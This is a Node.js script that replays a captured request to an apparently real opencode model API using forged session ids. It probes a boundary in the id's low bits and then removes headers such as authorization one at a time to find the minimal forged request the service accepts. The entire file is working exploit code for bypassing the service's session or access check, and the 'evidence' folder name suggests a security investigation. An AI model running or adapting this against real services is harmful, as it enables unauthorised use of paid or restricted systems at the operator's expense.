// Pin the boundary, then derive the MINIMAL recipe using a FORGED session id.
import fs from 'node:fs';
const LF = (import.meta.dirname + '/../07-原始证据/engine_http.jsonl');
const lines = fs.readFileSync(LF, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
const cap = lines.find((r) => r.kind === 'fetch' && !r.url.includes('127.0.0.1'));
const H = cap.headers, FULL = cap.body;
const TAIL = H['x-opencode-session-id'].slice(16);
const MINI = JSON.stringify({ model: 'deepseek-v4.1-flash-free', max_tokens: 16, messages: [{ role: 'user', content: 'Reply with exactly: PONG' }] });
const mk = (hexv) => { const s = 'ses_' + hexv + TAIL; return { ...H, 'x-opencode-session-id': s, 'x-opencode-session': s }; };
const FORGED = mk('000000000ffe'); // forged, ancient, but low12 >= 0xf00

async function t(name, headers, body) {
  try {
    const r = await fetch(cap.url, { method: 'POST', headers, body: body ?? FULL });
    const txt = (await r.text()).slice(0, 50).replace(/\s+/g, ' ');
    console.log(`[${name}] ${r.status} :: ${txt}`);
    return r.status;
  } catch (e) { console.log(`[${name}] ERR ${e.message}`); return -1; }
}

console.log('--- boundary ---');
await t('J1 low12=0xeff', mk('ebcf32130eff'));
await t('J2 low12=0xf00', mk('ebcf32130f00'));
await t('J3 low12=0xf01', mk('ebcf32130f01'));
await t('J4 low12=0x676 (failed earlier)', mk('ebceca7a0676'));

console.log('--- minimal recipe with FORGED id (000000000ffe) ---');
const noX = Object.fromEntries(Object.entries(FORGED).filter(([k]) => !['x-opencode-client', 'x-opencode-project'].includes(k.toLowerCase())));
const onlySid = { authorization: FORGED.authorization, 'content-type': FORGED['content-type'], 'user-agent': FORGED['user-agent'], 'x-opencode-session-id': FORGED['x-opencode-session-id'] };
const noUA = Object.fromEntries(Object.entries(FORGED).filter(([k]) => k.toLowerCase() !== 'user-agent'));
const noAuth = Object.fromEntries(Object.entries(FORGED).filter(([k]) => k.toLowerCase() !== 'authorization'));
await t('K0 forged + full headers + full body', FORGED);
await t('K1 = K0 minus authorization', noAuth);
await t('K2 = K0 minus client/project', noX);
await t('K3 = K0 minus user-agent', noUA);
await t('K4 = K0 with MINI body', FORGED, MINI);
await t('K5 = K0 but only session-id (no session/request)', onlySid);
